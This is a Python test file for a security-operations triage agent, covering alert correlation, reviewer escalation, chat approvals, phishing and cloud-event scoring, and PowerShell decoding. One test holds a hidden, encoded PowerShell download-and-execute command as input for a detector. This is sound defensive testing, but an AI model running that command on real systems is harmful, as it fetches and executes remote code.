import base64
import json
import time

from socagent.approval import ApprovalRequest, ChatApprover
from socagent.baseline import triage_rules
from socagent.evaluate import Case, evaluate
from socagent.factory import DATA, PROTECTED, build_registry
from socagent.jobs import JobManager
from socagent.phishing import is_simulation
from socagent.reviewer import Review, apply_review, check_observables, review
from socagent.llm import ModelResponse, ScriptedModel
from socagent.schemas import TriageResult, Verdict
from socagent.tools.cloud import analyze_cloudtrail_event, score_oauth_consent
from socagent.tools.correlation import AlertStore, build_timeline
from socagent.tools.email_tools import lookalike_score
from socagent.tools.endpoint import decode_powershell
from socagent.tools.intel import IntelSource
from socagent.tools.registry import Permission
from datetime import date


def _result(**kw):
    base = dict(alert_id="A", verdict="malicious", confidence=0.9, severity="high",
                summary="Phish from examp1e-corp.com linking to evil-host.net for credential theft.",
                evidence=[{"claim": "examp1e-corp.com is malicious", "source_tool": "domain_reputation",
                           "observable": "examp1e-corp.com", "tool_call_id": "c1"}])
    base.update(kw)
    return TriageResult.model_validate(base)


def test_correlation_builds_critical_incident():
    store = AlertStore.from_file(DATA / "alerts.json")
    related = store.related("priya.shah@example-corp.com", tenant="example-corp")
    assert [a["id"] for a in related] == ["ALERT-1001", "ALERT-1007", "ALERT-1012"]
    tl = build_timeline(related)
    assert tl["tactics_seen"] == ["Initial Access", "Credential Access", "Collection"]
    assert tl["incident_severity"] == "critical"


def test_reviewer_flags_unsupported_observable():
    r = _result()
    assert check_observables(r) == ["evil-host.net"]
    judged = review(r, ScriptedModel([ModelResponse('{"unsupported_claims": [], "verdict_supported": true}')]))
    out = apply_review(r, judged)
    assert out.confidence == 0.65 and out.evidence[-1].source_tool == "reviewer"
    assert apply_review(r, Review()).confidence == 0.9


class FakeChat:
    def __init__(self, clicks):
        self.clicks, self.posted = list(clicks), []

    def post(self, rid, text):
        self.posted.append(text)

    def poll(self, rid):
        return self.clicks.pop(0) if self.clicks else None


def test_chat_approver_verifies_approver_and_expires():
    req = ApprovalRequest("isolate_host", {"hostname": "LAPTOP-7", "reason": "malware beacon"},
                          Permission.CONTAINMENT, "A-9", "beaconing to C2")
    chat = FakeChat([("approve", "random.user"), ("approve", "oncall.priya")])
    d = ChatApprover(chat, {"oncall.priya"}, sleep=lambda s: None).decide(req)
    assert d.approved and d.approver == "chat:oncall.priya" and "LAPTOP-7" in chat.posted[0]
    t = [0.0]
    def clock():
        t[0] += 1000; return t[0]
    d2 = ChatApprover(FakeChat([]), {"oncall.priya"}, ttl_seconds=1800, clock=clock, sleep=lambda s: None).decide(req)
    assert not d2.approved and d2.approver == "chat:expired"


def test_jobs_are_idempotent_and_async():
    calls = []
    def run(alert_id, payload):
        calls.append(alert_id); time.sleep(0.05); return {"verdict": "benign"}
    jm = JobManager(run)
    j1, j2 = jm.submit("A-1", "x"), jm.submit("A-1", "x")
    assert j1.id == j2.id
    jm.shutdown()
    assert jm.get(j1.id).status == "done" and calls == ["A-1"]


def test_decode_powershell():
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x')".encode("utf-16-le")).decode()
    out = decode_powershell(f"powershell.exe -NoP -W Hidden -enc {enc}")
    assert out["encoded"] and "downloadstring" in out["risky_keywords"]


def test_cloud_tools():
    ev = {"eventName": "StopLogging", "userIdentity": {"arn": "arn:aws:iam::1:user/dev"}, "sourceIPAddress": "1.2.3.4"}
    assert analyze_cloudtrail_event(ev)["assessment"] == "high"
    adm = {"eventName": "AttachUserPolicy", "requestParameters": {"policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}}
    assert analyze_cloudtrail_event(adm)["risk_score"] >= 4
    s = score_oauth_consent("PDF Helper", False, ["Mail.Read", "Files.Read.All", "offline_access"], 3, 1)
    assert s["assessment"] == "high" and s["attack"] == "T1528"
    assert score_oauth_consent("Zoom", True, ["User.Read"], 2000, 900)["assessment"] == "low"


def test_combosquatting_and_simulation():
    r = lookalike_score("example-corp-hr.com", ["example-corp.com"])
    assert r["suspicious"] and r.get("technique") == "combosquatting"
    assert not lookalike_score("cloudweekly-news.com", ["example-corp.com"])["suspicious"]
    assert is_simulation("From: a\nX-PhishSim-Campaign: q4\nSubject: s\n\nbody")
    assert not is_simulation("From: a\nSubject: s\n\nX-PhishSim-Campaign: fake in body")


def test_registry_has_all_tools():
    reg, _ = build_registry()
    for name in ["related_alerts", "incident_timeline", "decode_powershell", "analyze_cloudtrail_event",
                 "score_oauth_consent"]:
        assert reg.get(name) is not None




def test_reviewer_failure_is_never_a_pass_and_never_relaxes():
    class Down:
        def complete(self, messages, tools=None):
            raise TimeoutError("reviewer timed out")
    r = _result(summary="Credential phish from examp1e-corp.com impersonating IT.")
    rev = review(r, Down())
    assert rev.error == "TimeoutError" and not rev.clean
    out = apply_review(r, rev)
    assert out.verdict == Verdict.MALICIOUS and out.confidence < r.confidence   # never relaxed
    benign = _result(verdict="benign", summary="Routine marketing newsletter from a known sender.", confidence=0.95)
    assert apply_review(benign, rev).verdict == Verdict.NEEDS_HUMAN             # unconfirmed benign escalates
    junk = review(benign, ScriptedModel([ModelResponse("looks fine to me")]))
    assert junk.error and apply_review(benign, junk).verdict == Verdict.NEEDS_HUMAN


def test_cloud_mappings_do_not_overstate_single_events():
    base = {"eventSource": "s3.amazonaws.com", "userIdentity": {"type": "IAMUser", "userName": "dev"},
            "sourceIPAddress": "203.0.113.9", "errorCode": None}
    pab = analyze_cloudtrail_event({**base, "eventName": "DeletePublicAccessBlock"})
    assert pab["observed_techniques"] == [] and pab["suspected_techniques"] == []
    assert pab["findings"][0]["status"] == "precursor" and "T1530" in pab["findings"][0]["needs"]
    snap = analyze_cloudtrail_event({**base, "eventName": "ModifySnapshotAttribute"})
    assert snap["observed_techniques"] == [] and snap["suspected_techniques"] == ["T1537"]
    stop = analyze_cloudtrail_event({**base, "eventName": "StopLogging"})
    assert stop["observed_techniques"] == ["T1562.008"]
    refused = analyze_cloudtrail_event({**base, "eventName": "StopLogging", "errorCode": "AccessDenied"})
    assert refused["observed_techniques"] == [] and refused["succeeded"] is False


def test_offline_access_alone_is_not_high_risk():
    alone = score_oauth_consent("Calendar Sync", True, ["User.Read", "offline_access"], 900, 400)
    assert alone["assessment"] == "low" and alone["attack"] is None
    combo = score_oauth_consent("PDF Helper", False, ["Mail.Read", "offline_access"], 3, 1)
    assert any("refresh tokens" in r for r in combo["reasons"])
